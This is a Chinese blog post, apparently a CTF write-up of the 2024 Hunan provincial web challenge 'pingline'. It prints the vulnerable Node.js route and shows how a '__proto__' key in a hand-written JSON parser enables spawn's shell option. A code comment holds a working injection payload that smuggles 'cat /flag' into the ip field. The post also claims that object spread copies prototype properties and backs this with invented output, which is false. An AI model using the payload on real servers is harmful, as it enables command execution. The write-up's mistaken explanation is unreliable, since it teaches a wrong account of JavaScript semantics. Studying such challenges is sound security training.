<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="Regulus"/><meta name="copyright" content="Regulus"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="js原型链污染,电子取证"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="2024湖南省省赛复现 | Mei的小窝"/><meta name="apple-mobile-web-app-title" content="2024湖南省省赛复现 | Mei的小窝"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2025/09/22/2024湖南省省赛复现/"/><meta name="description" content="2024湖南省省赛复现真的不妙啊，马上就要去打省赛了，但是怎么一开始就考原型链污染啊，后面也是java，搞不好要省赛爆零啊，杂项也不知道写不写的出 web[入口靶机]pingline附件下载下来有100多mb，看了一下是一个js的框架，但实际上和题目有关的就只有一个路由文件而已 123456789101112131415161718192021222324252627282930313233...">
<meta property="og:type" content="article">
<meta property="og:title" content="2024湖南省省赛复现 | Mei的小窝">
<meta property="og:url" content="http://example.com/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Mei的小窝">
<meta property="og:description" content="2024湖南省省赛复现真的不妙啊，马上就要去打省赛了，但是怎么一开始就考原型链污染啊，后面也是java，搞不好要省赛爆零啊，杂项也不知道写不写的出 web[入口靶机]pingline附件下载下来有100多mb，看了一下是一个js的框架，但实际上和题目有关的就只有一个路由文件而已 123456789101112131415161718192021222324252627282930313233...">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/assets/images/Hexo-Theme-MEOW.png">
<meta property="article:published_time" content="2025-09-22T02:09:38.000Z">
<meta property="article:modified_time" content="2025-12-26T09:11:32.832Z">
<meta property="article:author" content="Regulus">
<meta property="article:tag" content="js原型链污染">
<meta property="article:tag" content="电子取证">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>2024湖南省省赛复现 | Mei的小窝</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
<link rel="stylesheet" href="/css/style.css">
<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>Mei的小窝</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="搜索" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>搜索</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">Mei的小窝</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 Mei的小窝 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">2024湖南省省赛复现</h1><div class="post-author"><span>作者: Regulus</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2025-09-22</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2025-12-26</span></div></div><div class="post-read"><div class="post-wordcount"><img src="/assets/images/svg/ta/ta-write.svg" class="icon noview" alt="Icon"><span>总字数: 2.3k字</span></div><div class="post-readtime"><img src="/assets/images/svg/ta/ta-time.svg" class="icon noview" alt="Icon"><span>阅读时长: 8分钟</span></div><div class="post-pageview"><img src="/assets/images/svg/ta/ta-fire.svg" class="icon noview" alt="Icon"><span>访问量: </span><span id="vercount_value_page_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div><div class="post-attribute"><div class="post-tags"><img src="/assets/images/svg/ta/ta-tag.svg" class="icon noview" alt="Icon"><span><a class="post-tags-link" href="/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">js原型链污染</a><a class="post-tags-link" href="/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" rel="tag">电子取证</a></span></div></div></div><div class="post markdown" indent="false"><h1 id="2024湖南省省赛复现"><a href="#2024湖南省省赛复现" class="headerlink" title="2024湖南省省赛复现"></a>2024湖南省省赛复现</h1><p>真的不妙啊，马上就要去打省赛了，但是怎么一开始就考原型链污染啊，后面也是java，搞不好要省赛爆零啊，杂项也不知道写不写的出</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="入口靶机-pingline"><a href="#入口靶机-pingline" class="headerlink" title="[入口靶机]pingline"></a>[入口靶机]pingline</h3><p>附件下载下来有100多mb，看了一下是一个js的框架，但实际上和题目有关的就只有一个路由文件而已</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;use server&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; spawn &#125; <span class="keyword">from</span> <span class="string">&quot;node:child_process&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reinventing the wheel and make it square</span></span><br><span class="line"><span class="comment"> * Because JSON.parse is not available in the server environment (really?)</span></span><br><span class="line"><span class="comment"> */</span>  <span class="comment">//这里提示这个文件写了一个函数用于解析json数据</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jsonParse</span>(<span class="params"></span></span><br><span class="line"><span class="params">  str: string,</span></span><br><span class="line"><span class="params">  ret?: Record&lt;string, any&gt;<span class="comment">//两个参数ret参数可以不提供则为空对象 Record&lt;string, any&gt;是ts的对象</span></span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Record</span>&lt;string, any&gt; &#123;<span class="comment">//指定返回一个对象</span></span><br><span class="line">  ret ??= &#123;&#125;;<span class="comment">//如果ret是null或undefined，则赋值为空对象&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(str.<span class="title function_">startsWith</span>(<span class="string">&quot;&#123;&quot;</span>) &amp;&amp; str.<span class="title function_">endsWith</span>(<span class="string">&quot;&#125;&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> matches = str</span><br><span class="line">    .<span class="title function_">slice</span>(<span class="number">1</span>, str.<span class="property">length</span> - <span class="number">1</span>)</span><br><span class="line">    .<span class="title function_">matchAll</span>(</span><br><span class="line">      <span class="regexp">/(?:^|,)\s*&quot;(?&lt;key&gt;\w+)&quot;\s*:\s*(?&lt;value&gt;\d+|(?:true|false)|&quot;(?:\\.|[^&quot;])*&quot;|\&#123;.+?&#125;)/g</span></span><br><span class="line">    );<span class="comment">//这个正则在题目中不需要看，听ai说这是一个用来匹配键值对的正则</span></span><br><span class="line"><span class="comment">//这个是在str字符串调用slice方法去掉前后的&#123;&#125;然后调用matchAll方法将键值对转换为数组</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> match <span class="keyword">of</span> matches) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; key, value &#125; = match.<span class="property">groups</span>!;</span><br><span class="line">    <span class="keyword">if</span> (value.<span class="title function_">startsWith</span>(<span class="string">&#x27;&quot;&#x27;</span>)) &#123;</span><br><span class="line">      ret[key] = value<span class="comment">//这里是重点，将一个对象的键值赋值一个值 key和value我们都可以控制</span></span><br><span class="line">        .<span class="title function_">slice</span>(<span class="number">1</span>, value.<span class="property">length</span> - <span class="number">1</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\\(u([0-9a-fA-F]&#123;4&#125;)|.)/g</span>, <span class="function">(<span class="params">_, m: string, code: string</span>) =&gt;</span></span><br><span class="line">          m === <span class="string">&quot;u&quot;</span><span class="comment">//这个正则在题目中也不要看，是用来还原一些不可见字符</span></span><br><span class="line">            ? <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(code, <span class="number">16</span>))</span><br><span class="line">            : (&#123; <span class="attr">b</span>: <span class="string">&quot;\b&quot;</span>, <span class="attr">f</span>: <span class="string">&quot;\f&quot;</span>, <span class="attr">n</span>: <span class="string">&quot;\n&quot;</span>, <span class="attr">r</span>: <span class="string">&quot;\r&quot;</span>, <span class="attr">t</span>: <span class="string">&quot;\t&quot;</span> &#125;[m] ?? m)</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value.<span class="title function_">startsWith</span>(<span class="string">&quot;&#123;&quot;</span>)) &#123;<span class="comment">//如果json值中又嵌套了一个json数据</span></span><br><span class="line">      <span class="keyword">if</span> (!(key <span class="keyword">in</span> ret)) ret[key] = &#123;&#125;;</span><br><span class="line">      <span class="title function_">jsonParse</span>(value, ret[key]);<span class="comment">//重点在这，原型链污染的特征，就是取一个数组的值作为参数进行函数嵌套 我们可以控制key为__proto__则访问到了Object</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ret[key] = &#123; <span class="attr">true</span>: <span class="literal">true</span>, <span class="attr">false</span>: <span class="literal">false</span> &#125;[value] ?? +value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">pingAction</span>(<span class="params">data: string, count: number = <span class="number">4</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">body</span>: &#123; ip?: string &#125; = <span class="title function_">jsonParse</span>(data);<span class="comment">//调用jsonParse</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> proc = <span class="title function_">spawn</span>(<span class="string">&quot;ping&quot;</span>, [<span class="string">`-c<span class="subst">$&#123;count&#125;</span>`</span>, body.<span class="property">ip</span>!, <span class="string">&quot;-W1&quot;</span>], &#123;</span><br><span class="line">    <span class="attr">stdio</span>: [<span class="string">&quot;inherit&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;pipe&quot;</span>],</span><br><span class="line">    <span class="attr">env</span>: &#123; ...process.<span class="property">env</span>, <span class="attr">LC_ALL</span>: <span class="string">&quot;C.UTF-8&quot;</span> &#125;,</span><br><span class="line">  &#125;);<span class="comment">//这里是命令执行，也是这个题目的重点</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> output = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  proc.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> (output += data));</span><br><span class="line">  proc.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> (output += data));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> proc.<span class="title function_">on</span>(<span class="string">&quot;close&quot;</span>, resolve));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> output;</span><br><span class="line">&#125;<span class="comment">//&#123;&quot;ip&quot;: &quot;127.0.0.1;cat /flag;ping -c4 127.0.0.1&quot;, &quot;__proto__&quot;: &#123;&quot;shell&quot;: true&#125;&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们找到server文件夹下的ping.ts文件，题目是pingline，于是推测这是一个命令拼接的题目</p>
<p>看完了这个题目的代码，终于看明白是如何进行命令执行和原型链污染了，但是不愧是省赛的题目，我都不知道该原型链污染哪里，尝试了直接在127.0.0.1后面拼接命令，但是肯定是不行的，今年可千万别上来就是原型链污染啊</p>
<p>然后去看了一下题解才知道，问题出在spawn上面了，我们先来了解一下spawn</p>
<p>基本语法</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(<span class="attr">command</span>: string, args?: string[], options?: <span class="title class_">Object</span>)</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<ul>
<li><code>command</code>: 要执行的命令（例如 <code>ls</code>, <code>git</code>, <code>find</code>）。</li>
<li><code>args</code>: 传递给命令的参数<strong>数组</strong>。这是将命令参数化的安全方式。</li>
<li><code>options</code>: 一个可选的配置对象（常用选项见下文）。</li>
</ul>
<p>重点在于options这个属性，spawn默认是通过参数传递字符串而不是拼接，就导致我们无法直接命令拼接执行，但是在spawn中有一个shell配置，默认为false，如果为true则是通过shell去执行命令，是进行命令拼接而不是作为参数传递，所以我们想要进行命令拼接就需要先将shell配置为true</p>
<p>常见的配置方法</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接配置</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> proc = <span class="title function_">spawn</span>(<span class="string">&quot;ping&quot;</span>, [<span class="string">&quot;-c4&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>], &#123;</span><br><span class="line">    <span class="attr">stdio</span>: [<span class="string">&quot;inherit&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;pipe&quot;</span>],</span><br><span class="line">    <span class="attr">shell</span>: <span class="literal">true</span>, <span class="comment">// 直接在这里设置</span></span><br><span class="line">    <span class="attr">env</span>: &#123; ...process.<span class="property">env</span>, <span class="attr">LC_ALL</span>: <span class="string">&quot;C.UTF-8&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//通过环境变量配置</span></span><br><span class="line"><span class="comment">// 通过原型链污染环境变量</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">shell</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">process.<span class="property">env</span>.<span class="property">__proto__</span>.<span class="property">shell</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当执行以下代码时：</span></span><br><span class="line"><span class="keyword">const</span> proc = <span class="title function_">spawn</span>(<span class="string">&quot;ping&quot;</span>, [<span class="string">&quot;-c4&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>], &#123;</span><br><span class="line">    <span class="attr">stdio</span>: [<span class="string">&quot;inherit&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;pipe&quot;</span>],</span><br><span class="line">    <span class="attr">env</span>: &#123; ...process.<span class="property">env</span>, <span class="attr">LC_ALL</span>: <span class="string">&quot;C.UTF-8&quot;</span> &#125;, <span class="comment">// 这里会展开 process.env</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//不是布尔值而是shell路径也可以</span></span><br><span class="line"><span class="keyword">const</span> proc = <span class="title function_">spawn</span>(<span class="string">&quot;ping&quot;</span>, [<span class="string">&quot;-c4&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>], &#123;</span><br><span class="line">    <span class="attr">stdio</span>: [<span class="string">&quot;inherit&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;pipe&quot;</span>],</span><br><span class="line">    <span class="attr">shell</span>: <span class="string">&#x27;/bin/bash&#x27;</span>, <span class="comment">// 指定 shell 路径</span></span><br><span class="line">    <span class="attr">env</span>: &#123; ...process.<span class="property">env</span>, <span class="attr">LC_ALL</span>: <span class="string">&quot;C.UTF-8&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们可以看到第二种方法就是配置的时候的这个代码</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">env</span>: &#123; ...process.<span class="property">env</span>, <span class="attr">LC_ALL</span>: <span class="string">&quot;C.UTF-8&quot;</span> &#125;</span><br><span class="line"><span class="comment">//spawn中的env配置项用于决定子进程的环境变量</span></span><br><span class="line"><span class="comment">//...process.env  ...是展开操作符 用于展开环境变量process.env  展开后我们可以改变环境变量</span></span><br><span class="line"><span class="comment">//LC_ALL: &quot;C.UTF-8&quot;  覆盖或者新增环境变量</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p> 重点在于<strong>展开操作会沿着原型链查找可枚举属性</strong>！</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 污染 Object.prototype</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">shell</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">evil</span> = <span class="string">&#x27;hacked&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// process.env 的正常环境变量</span></span><br><span class="line">process.<span class="property">env</span>.<span class="property">PATH</span> = <span class="string">&#x27;/usr/bin&#x27;</span>;</span><br><span class="line">process.<span class="property">env</span>.<span class="property">HOME</span> = <span class="string">&#x27;/home/user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用展开操作符</span></span><br><span class="line"><span class="keyword">const</span> newEnv = &#123; ...process.<span class="property">env</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newEnv);</span><br><span class="line"><span class="comment">// 输出可能包含：</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//   PATH: &#x27;/usr/bin&#x27;,</span></span><br><span class="line"><span class="comment">//   HOME: &#x27;/home/user&#x27;,</span></span><br><span class="line"><span class="comment">//   shell: true,       // 来自原型链！</span></span><br><span class="line"><span class="comment">//   evil: &#x27;hacked&#x27;     // 来自原型链！</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p><code>...obj</code> 实际上等价于：</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">    <span class="comment">// 但注意：实际上展开操作符不会做 hasOwnProperty 检查！</span></span><br><span class="line">    result[key] = obj[key];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 